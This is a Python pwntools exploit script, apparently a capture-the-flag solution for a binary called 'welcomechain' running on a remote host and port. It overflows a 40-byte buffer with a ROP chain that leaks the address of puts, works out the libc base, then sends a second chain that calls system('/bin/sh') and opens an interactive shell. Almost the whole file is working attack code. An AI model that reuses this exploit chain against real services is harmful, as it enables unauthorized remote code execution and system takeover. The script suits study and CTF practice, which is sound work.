from pwn import *
import sys

binary = './welcomechain'

elf = ELF(binary)
context.binary = binary

host = '114.177.250.4'
port = 2226

if len(sys.argv) >= 2 and sys.argv[1] == 'r':
    # remote
    r = remote(host, port)
    libc = ELF('./libc.so.6')
else:
    # local
    r = process(binary)
    libc = elf.libc

overflow_len = 40

# elf
addr_plt_puts = elf.plt['puts']
addr_got_puts = elf.got['puts']
addr_symbols_main = elf.symbols['main']

# libc
offset_puts = libc.symbols['puts']
offset_printf = libc.symbols['printf']
offset_system = libc.symbols['system']
offset_binsh = 0x1b3e9a # readelf -tx

ret = elf.search(asm('ret')).next() # asm: convert to machine language
pop_rdi = elf.search(asm('pop rdi; ret')).next()
#pop_rsi_r15 = elf.search(asm('pop rsi ; pop r15 ; ret')).next()


# libc base
payload = ''
payload += "A"*overflow_len
payload += p64(pop_rdi)
payload += p64(addr_got_puts)
payload += p64(addr_plt_puts)
payload += p64(addr_symbols_main)
#payload += addr_symbols_welcome


#print("puts_plt_addr: {}".format(hex(addr_plt_puts)))
#print("puts_got_addr: {}".format(hex(addr_got_puts)))

prompt = "Please Input : "
prompt2 = "Your input is : "

r.sendline(payload)
r.recvuntil(prompt2)
print(r.recvline())

addr_puts = u64(r.recv(6) + b"\x00\x00")
print("printf_addr: {}".format(hex(addr_puts)))

libc_base = addr_puts - offset_puts
print("libc_base: {}".format(hex(libc_base)))

addr_system = libc_base + offset_system
print("addr_system: {}".format(hex(addr_system)))

addr_binsh = libc_base + offset_binsh
print("addr_binsh: {}".format(hex(addr_binsh)))

# exploit
payload = ''
payload += "A" * overflow_len
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_system)
payload += p64(addr_symbols_main)

r.sendline(payload)

r.interactive()
